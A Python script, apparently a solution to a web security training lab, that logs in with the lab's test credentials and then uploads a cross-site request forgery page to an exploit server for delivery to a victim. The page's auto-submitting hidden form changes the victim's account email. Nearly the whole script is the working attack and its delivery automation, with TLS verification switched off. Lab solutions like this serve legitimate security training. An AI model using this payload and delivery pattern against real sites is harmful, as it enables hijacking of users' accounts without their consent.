from bs4 import BeautifulSoup
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]



def check_login_and_cookie_getter(session, url, username, password):
    csrf_token = get_csrf_token(session, url)
    resp = session.post(url, data={"csrf": csrf_token, "username": username, "password": password}, verify=False, allow_redirects=False)
    
    if resp.status_code != 302:
        raise ValueError(f"Login request failed with status code {resp.status_code}")
    
    session_cookie = resp.cookies.get('session')
    if not session_cookie:
        raise ValueError("Session cookie not found after login")
    
    return True

def store_csrf_poc (session, url, payload) :
    params = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": payload,
        "formAction": "DELIVER_TO_VICTIM"
    }

    resp = session.post(url, data=params, verify=False, allow_redirects=False)
    
    if resp.status_code not in (302,200):
        raise ValueError(f"CSRF POST request failed with status code {resp.status_code}")
    else :
        print("CSRF POC stored successfully")
        print("Koated !!!")
        return True
    
def main():
    host = "https://0a80009504b61fad8178caee0059000a.web-security-academy.net"
    exploit_host = "https://exploit-0a84009a04af1f5981c8c9b9013f00a1.exploit-server.net/"
    login_url = f"{host}/login"
    
    session1= requests.Session()
    session2= requests.Session()

    payload = f'''
    <html>
	<body>
		<form method="POST" action="{host}/my-account/change-email">
			<input type="hidden" name="email" value="tes123t@gmail.com"/>
			<input type="submit" value="Submit">
		</form>
               <script>
                       document.forms[0].submit();
               </script>
	</body>
</html>
    '''

    session1 = requests.Session()
    if check_login_and_cookie_getter(session1, login_url, "wiener", "peter"):
        print("Login successful and session cookie obtained.")
        store_csrf_poc(session2, f"{exploit_host}/", payload)


if __name__ == "__main__":
    main()